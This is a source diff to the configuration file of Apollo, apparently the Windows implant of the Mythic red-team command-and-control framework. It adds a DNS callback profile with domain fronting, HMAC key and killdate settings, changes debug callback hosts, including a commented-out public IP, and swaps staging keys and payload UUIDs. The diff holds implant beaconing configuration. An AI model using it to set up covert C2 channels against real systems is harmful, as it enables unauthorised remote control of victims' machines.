@@ -1,7 +1,8 @@
 ﻿#define C2PROFILE_NAME_UPPER
 
 #if DEBUG
-#define HTTP
+//#define HTTP
+#define DNS
 //#define C3
 #endif
 
@@ -15,6 +16,9 @@ using System.Text;
 using ApolloInterop.Structs.ApolloStructs;
 using PSKCryptography;
 using ApolloInterop.Serializers;
+#if DNS
+using DnsTransport;
+#endif
 #if SMB
 using NamedPipeTransport;
 #endif
@@ -41,8 +45,10 @@ namespace Apollo
 #if DEBUG
                         { "callback_interval", "5" },
                         { "callback_jitter", "0" },
+                        //{ "callback_port", "443" },
+                        //{ "callback_host", "https://34.41.225.176" },
                         { "callback_port", "80" },
-                        { "callback_host", "http://mythic" },
+                        { "callback_host", "http://127.0.0.1" },
                         { "post_uri", "data" },
                         { "encrypted_exchange_check", "T" },
                         { "proxy_host", "" },
@@ -65,6 +71,39 @@ namespace Apollo
                         { "proxy_pass", "proxy_pass_here" },
                         { "killdate", "killdate_here" },
                         HTTP_ADDITIONAL_HEADERS_HERE
+#endif
+                    }
+                }
+            },
+#endif
+#if DNS
+            { "dns", new C2ProfileData()
+                {
+                    TC2Profile = typeof(DnsProfile),
+                    TCryptography = typeof(PSKCryptographyProvider),
+                    TSerializer = typeof(EncryptedJsonSerializer),
+                    Parameters = new Dictionary<string, string>()
+                    {
+#if DEBUG
+                        { "callback_interval", "5" },
+                        { "callback_jitter", "0" },
+                        { "callback_domains", "domain1.com" },
+                        { "encrypted_exchange_check", "T" },
+                        { "domain_front", "domain_front" },
+                        { "msginit", "init" },
+                        { "msgdefault", "default" },
+                        { "hmac_key", "hmac secret key" },
+                        { "killdate", "-1" },
+#else
+                        { "callback_interval", "callback_interval_here" },
+                        { "callback_jitter", "callback_jitter_here" },
+                        { "callback_domains", "callback_domains_here" },
+                        { "encrypted_exchange_check", "encrypted_exchange_check_here" },
+                        { "domain_front", "domain_front_here" },
+                        { "msginit", "msginit_here" },
+                        { "msgdefault", "msgdefault_here" },
+                        { "hmac_key", "hmac_key_here" },
+                        { "killdate", "killdate_here" },
 #endif
                     }
                 }
@@ -98,7 +137,8 @@ namespace Apollo
                     Parameters = new Dictionary<string, string>()
                     {
 #if DEBUG
-                        { "pipename", "ahatojqq-bo0w-oc3r-wqtg-4jf7voepqqbs" },
+                        //{ "pipename", "ahatojqq-bo0w-oc3r-wqtg-4jf7voepqqbs" },
+                        { "pipename", "testdbg" },
                         { "callback_interval", "40" },
                         { "callback_jitter", "0" },
                         { "encrypted_exchange_check", "T" },
@@ -137,20 +177,26 @@ namespace Apollo
         public static Dictionary<string, C2ProfileData> IngressProfiles = new Dictionary<string, C2ProfileData>();
 #if DEBUG
 #if HTTP
-        public static string StagingRSAPrivateKey = "yKspD9WUraWq3tUl2MKRaF0cHGf85K0gFnZj0olZzaQ=";
+        //public static string StagingRSAPrivateKey = "CFhesRs6+7q04B5fCmG0tKNjU9yExDwn+LMIDVONN/s=";
+        public static string StagingRSAPrivateKey = "2tsm5J4zxPQhmaYQkfZBL+xkxGMxfHwwfLIUvdz+/8M=";
+#elif DNS
+        public static string StagingRSAPrivateKey = "2tsm5J4zxPQhmaYQkfZBL+xkxGMxfHwwfLIUvdz+/8M=";
 #elif SMB
         public static string StagingRSAPrivateKey = "cnaJ2eDg1LVrR5LK/u6PkXuBjZxCnksWjy0vEFWsHIU=";
 #elif C3
-        public static string StagingRSAPrivateKey = "pvamqNAN2v56eh/SibXQxOZWJCzG0JorUqBpd4+sdlI=";
+        public static string StagingRSAPrivateKey = "3GXt0pgLByfL+d18EdgR3Miv2809Ta17noIql8w+dVc=";
 #elif TCP
         public static string StagingRSAPrivateKey = "LbFpMoimB+aLx1pq0IqXJ1MQ4KIiGdp0LWju5jUhZRg=";
 #endif
 #if HTTP
-        public static string PayloadUUID = "74579531-d8d5-4f7b-9074-eb39088abe4d";
+        //public static string PayloadUUID = "df52c064-75c0-4861-b4b8-e3782cf30740";
+        public static string PayloadUUID = "6b7c114f-3661-4e89-974f-65b0c1264043";
+#elif DNS
+        public static string PayloadUUID = "6b7c114f-3661-4e89-974f-65b0c1264043";
 #elif SMB
         public static string PayloadUUID = "869c4909-30eb-4a90-99b2-874dae07a0a8";
 #elif C3
-        public static string PayloadUUID = "764a3a8d-21a1-4380-a9b0-4a6dbb266826";
+        public static string PayloadUUID = "f30f6fba-5a16-4dc3-af4c-7ae6c500090a";
 #elif TCP
         public static string PayloadUUID = "a51253f6-7885-4fea-9109-154ecc54060d";
 #endif
